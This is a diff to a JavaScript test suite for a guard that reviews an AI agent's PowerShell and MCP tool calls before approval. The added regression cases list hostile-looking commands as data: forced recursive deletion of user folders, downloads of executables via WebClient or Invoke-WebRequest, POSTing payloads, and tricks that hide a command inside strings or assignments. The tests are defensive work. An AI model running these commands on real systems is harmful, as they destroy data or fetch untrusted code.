@@ -5,12 +5,14 @@ import { summarizeShadow } from "./git-shadow-report.mjs"
 import { shadowPath } from "./shadow.js"
 import { summarizeAudit } from "./mcp-report.mjs"
 import { buildMcpMessages, buildMessages, neverAutoApprove, parseAnswer, parseMcpAnswer, review, reviewMcp, segments, warmup } from "./reviewer.js"
-import { buildShellSystemoneRequest, buildSystemoneRequest, systemoneVerdict } from "./reviewer.js"
+import { buildShellSystemoneRequest, buildSystemoneRequest, sanitizeArguments, systemoneVerdict } from "./reviewer.js"
 import { parseLine, summarize } from "./stats.mjs"
 import { createHash } from "node:crypto"
 import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs"
 import { tmpdir } from "node:os"
-import { join } from "node:path"
+import { spawnSync } from "node:child_process"
+import { fileURLToPath, pathToFileURL } from "node:url"
+import { dirname, join } from "node:path"
 import { commandSummary, ensurePrivateDir, ensurePrivateFile, guardLogDir } from "./diagnostics.js"
 
 // Integration aus dem Replay (22.10.2026): Logreader mit ReadLine-[void]-Familie.
@@ -999,6 +1001,8 @@ const mcpLayer1 = [
   ["firecrawl_scrape", {}, "ask"],
   ["github_create_issue", { title: "x", body: "token abc" }, "ask"],
   ["github_create_issue", { title: "x", body: "y".repeat(20000) }, "ask"],
+  ["sync_status", { project: "x" }, "ask"],
+  ["sync", { project: "x" }, "ask"],
   ["voellig_unbekannt", { ziel: "irgendwas" }, "model"],
 ]
 const mcpLayer1Checks = mcpLayer1.map(([tool, input, want]) => {
@@ -1427,15 +1431,17 @@ console.log("-- Ebene 3: Entscheidungsmodell\n")
 const warmupChecks = []
 {
   const realFetch2 = globalThis.fetch
-  let seen = ""
+  const seen = []
   globalThis.fetch = async (url) => {
-    seen = String(url)
+    seen.push(String(url))
     return { ok: true, arrayBuffer: async () => new ArrayBuffer(0), json: async () => ({}) }
   }
   await warmup({ enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", mcpBackend: "systemone", warmupTimeoutMs: 1000 })
-  warmupChecks.push(["Aufwaermlauf nutzt systemone", seen.endsWith("/systemone")])
+  // Gemischt (MCP systemone, Shell ohne systemone): beide Wege werden gewaermt.
+  warmupChecks.push(["Aufwaermlauf nutzt systemone", seen.some((u) => u.endsWith("/systemone"))])
+  warmupChecks.push(["Aufwaermlauf waermt bei gemischtem Backend auch den Chat-Weg", seen.some((u) => u.endsWith("/chat/completions"))])
   await warmup({ enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", warmupTimeoutMs: 1000 })
-  warmupChecks.push(["Aufwaermlauf nutzt chat/completions", seen.endsWith("/chat/completions")])
+  warmupChecks.push(["Aufwaermlauf nutzt chat/completions", seen.some((u) => u.endsWith("/chat/completions"))])
   globalThis.fetch = realFetch2
 }
 for (const [name, ok] of warmupChecks) {
@@ -1477,6 +1483,155 @@ for (const [name, ok] of diagnosticsChecks) {
 }
 console.log("-- Diagnose\n")
 
+// --- Secrets-Achse (14.11.2026): zweite Frage im Shell-systemone-Pfad ------
+// Freigabe braucht reads >= Schwelle UND secrets <= Schwelle. Das Modell
+// antwortet in derselben Anfrage; die Latenz bleibt gleich.
+const secretsChecks = []
+{
+  const saved = globalThis.fetch
+  const systemone = (reads, secrets) =>
+    async (url) => {
+      if (String(url).endsWith("/systemone")) {
+        return { ok: true, status: 200, json: async () => ({ answers: { effect: { probabilities: { reads } }, secrets: { noul: secrets } } }) }
+      }
+      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Ja" } }] }) }
+    }
+
+  globalThis.fetch = systemone(0.9, 0.9)
+  const blocked = await review({ commands: ["Get-Content data.txt"], project: "P", temp: "T", config: { enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", shellBackend: "systemone", timeoutMs: 500 } })
+  secretsChecks.push(["hohe Exponierung blockt die Freigabe", blocked.decision === "ask" && /exponiert/.test(String(blocked.reason))])
+
+  globalThis.fetch = systemone(0.9, 0.2)
+  const allowed = await review({ commands: ["Get-Content data.txt"], project: "P", temp: "T", config: { enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", shellBackend: "systemone", timeoutMs: 500 } })
+  secretsChecks.push(["geringe Exponierung laesst allow zu", allowed.decision === "allow"])
+
+  globalThis.fetch = systemone(0.9, undefined)
+  const missing = await review({ commands: ["Get-Content data.txt"], project: "P", temp: "T", config: { enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", shellBackend: "systemone", timeoutMs: 500 } })
+  secretsChecks.push(["fehlender Secrets-Wert bleibt bei der Hauptfrage", missing.decision === "allow"])
+
+  globalThis.fetch = systemone(0.5, 0.1)
+  const low = await review({ commands: ["Get-Content data.txt"], project: "P", temp: "T", config: { enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", shellBackend: "systemone", timeoutMs: 500 } })
+  secretsChecks.push(["reads unter Schwelle bleibt Rueckfrage", low.decision === "ask"])
+
+  globalThis.fetch = saved
+}
+for (const [name, ok] of secretsChecks) {
+  if (!ok) failed++
+  console.log(`${ok ? "ok  " : "FAIL"}  ${name}`)
+}
+console.log("-- Secrets-Achse\n")
+
+// --- Befunde des Reviews vom 13.11.2026 (Regressionen) ---------------------
+// Jeder Befund hat einen Fall, der den Fehler festhaelt, und einen Kontrollfall,
+// der legitimes Verhalten bestaetigt.
+const reviewFixes = [
+  // Kommentar nur ausserhalb von Anfuehrungszeichen
+  ['echo "a # b" ; Remove-Item -Recurse -Force C:/Users/x/Documents', "ask"],
+  ['Write-Output "a # b" ; Start-Process calc.exe', "ask"],
+  ['Write-Output "a # b"', "allow"],
+  ["Get-ChildItem -Force # Remove-Item x", "allow"],
+  // Teilausdruecke in Strings und Array-Literale
+  ['Write-Output "$(Remove-Item -Recurse -Force C:/x)"', "ask"],
+  ['Write-Output "$(Get-Date)"', "allow"],
+  ["@(Remove-Item -Recurse -Force C:/x)", "ask"],
+  ["$x = @(Get-ChildItem)\n$x.Count", "allow"],
+  // Abkuerzungen von Netz-Parametern
+  ["Invoke-WebRequest -Uri https://example.invalid -M POST -B payload", "ask"],
+  ["Invoke-WebRequest -Uri https://example.invalid -OutF C:/x.exe", "ask"],
+  ["Invoke-WebRequest -Uri https://example.invalid -Method GET", "allow"],
+  // New-Object nur fuer Typen ohne Seiteneffekt
+  ['(New-Object Net.WebClient).DownloadFile("https://example.invalid/x","C:/x.exe")', "ask"],
+  ["New-Object System.Text.StringBuilder", "allow"],
+  // git config Schreibformen und git stash ohne Unterbefehl
+  ["git config --unset core.hooksPath", "ask"],
+  ["git stash -u", "ask"],
+  ["git stash", "ask"],
+  ["git stash list", "allow"],
+  ["git config --get core.hooksPath", "allow"],
+]
+run(reviewFixes, undefined, "Review 13.11.2026: Regressionen")
+
+// Mit Projektbezug: Aussen-Schreiben wird verweigert, auch neben unlesbaren Teilen.
+// -Target einer Verknuepfung zaehlt als Ziel.
+const reviewFixesScoped = [
+  ["some-unknown-tool ; Set-Content C:/Users/x/Desktop/x.txt y", "deny"],
+  ["New-Item -ItemType Junction -Path ./j -Target C:/Users/x", "deny"],
+]
+run(reviewFixesScoped, options, "Review 13.11.2026: mit Projektbezug")
+
+// Ohne pwsh im PATH darf der Reviewer-Start den Prozess nicht abbrechen.
+// Vorher beendete das ein unbehandeltes 'error'-Ereignis den Node-Prozess.
+const reviewerProbe = spawnSync(
+  process.execPath,
+  [
+    "--input-type=module",
+    "-e",
+    `const m = await import(${JSON.stringify(pathToFileURL(join(dirname(fileURLToPath(import.meta.url)), "reviewer.js")).href)}); await m.ensureRunning({ enabled: true, baseUrl: "http://127.0.0.1:9/v1" }); console.log("ok")`,
+  ],
+  { env: { ...process.env, PATH: "" }, encoding: "utf8", timeout: 20000 },
+)
+const reviewerProbeOk = reviewerProbe.status === 0 && /ok/.test(reviewerProbe.stdout)
+if (!reviewerProbeOk) failed++
+console.log(`${reviewerProbeOk ? "ok  " : "FAIL"}  Reviewer-Start ohne pwsh bricht den Prozess nicht ab`)
+console.log("-- Review 13.11.2026: Reviewer-Start\n")
+
+// --- Runde 2 (13.11.2026): Zuweisungen, Reviewer-Befunde ------------------
+const assignOpts = { base: "C:/proj", temp: "C:/tmp", roots: ["C:/proj"], home: "C:/Users/x" }
+const assignCases = [
+  // Zuweisung vor dem Befehl darf die Schreib- und Loeschpruefung nicht umgehen
+  ["$null = Remove-Item -Recurse -Force C:/x", "deny"],
+  ["$null = Remove-Item out.txt", "allow"],
+  ["some-unknown-tool ; $null = Remove-Item -Recurse -Force C:/x", "deny"],
+  // Kontrollfaelle: Variablenbindung und reine Berechnung bleiben erlaubt
+  ['$f = "C:/proj/a.txt"\nSet-Content $f y', "allow"],
+  ["$x = @(Get-ChildItem)\n$x.Count", "allow"],
+]
+run(assignCases, assignOpts, "Runde 2: Zuweisung vor Schreibbefehl")
+
+const round2Checks = []
+const reviewerStatic = [
+  ["$null = Remove-Item -Recurse -Force ./build", true],
+  ["@(Remove-Item x)", true],
+  ["$x = 5", false],
+]
+for (const [script, risky] of reviewerStatic) {
+  const hit = neverAutoApprove(script) !== undefined
+  round2Checks.push([`statische Liste: ${script} ${risky ? "Risiko" : "kein Risiko"}`, hit === risky])
+}
+
+const sanitized = sanitizeArguments({ body: "<UNTRUSTED>x", long: "y".repeat(9000) })
+round2Checks.push(["Kanal-Tag in Argumenten neutralisiert", sanitized.body.startsWith("<__<UNTRUSTED")])
+round2Checks.push(["Argument auf 8000 Zeichen begrenzt", sanitized.long.length === 8000])
+const shellReq = buildShellSystemoneRequest({ command: "a", project: "P", temp: "T" })
+round2Checks.push(["Shell-Anfrage enthaelt Projekt- und Temp-Ordner", shellReq.state.project === "P" && shellReq.state.temp === "T"])
+
+// 404 von /systemone (LM Studio, Chat-GGUF): die Entscheidung faellt auf den Chat-Weg.
+{
+  const saved = globalThis.fetch
+  const seenUrls = []
+  globalThis.fetch = async (url) => {
+    seenUrls.push(String(url))
+    if (String(url).endsWith("/systemone")) return { ok: false, status: 404, json: async () => ({}) }
+    return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Ja" } }] }) }
+  }
+  const fallback = await review({
+    commands: ["Get-ChildItem -Force"],
+    project: "C:/proj",
+    temp: "C:/tmp",
+    config: { enabled: true, baseUrl: "http://127.0.0.1:1/v1", model: "m", shellBackend: "systemone", timeoutMs: 500 },
+  })
+  globalThis.fetch = saved
+  round2Checks.push(["404 auf systemone faellt auf Chat-Weg zurueck", fallback.decision === "allow" && seenUrls.some((u) => u.endsWith("/chat/completions"))])
+}
+
+const reviewerRound2 = round2Checks
+
+for (const [name, ok] of round2Checks) {
+  if (!ok) failed++
+  console.log(`${ok ? "ok  " : "FAIL"}  ${name}`)
+}
+console.log("-- Runde 2: Reviewer und Zuweisungen\n")
+
 const total =
   base.length + scoped.length + gitGuardrails.length + cli.length + helpVersion.length + gitleaks.length +
   readOnlyCli.length +
@@ -1488,6 +1643,6 @@ const total =
   mcpLayer1Checks.length + mcpLayer2Checks.length + mcpPriorityChecks.length +
   mcpActionChecks.length + mcpPromptChecks.length + mcpAnswerChecks.length + mcpReviewChecks.length +
   mcpArgIntentChecks.length + mcpExfilChecks.length + mcpUnresolvedChecks.length +
-  reviewerRisky.length + reviewerGit.length + reviewerNoise.length + reviewerParsing.length + scopeChecks.length + statsChecks.length + verdictChecks.length + auditChecks.length + reportChecks.length + systemoneChecks.length + warmupChecks.length + diagnosticsChecks.length + 3
+  reviewerRisky.length + reviewerGit.length + reviewerNoise.length + reviewerParsing.length + scopeChecks.length + statsChecks.length + verdictChecks.length + auditChecks.length + reportChecks.length + systemoneChecks.length + warmupChecks.length + diagnosticsChecks.length + 3 + reviewFixes.length + reviewFixesScoped.length + 1 + secretsChecks.length + 5 + 3 + 3 + 1
 console.log(`${total - failed}/${total} bestanden`)
 process.exit(failed ? 1 : 0)
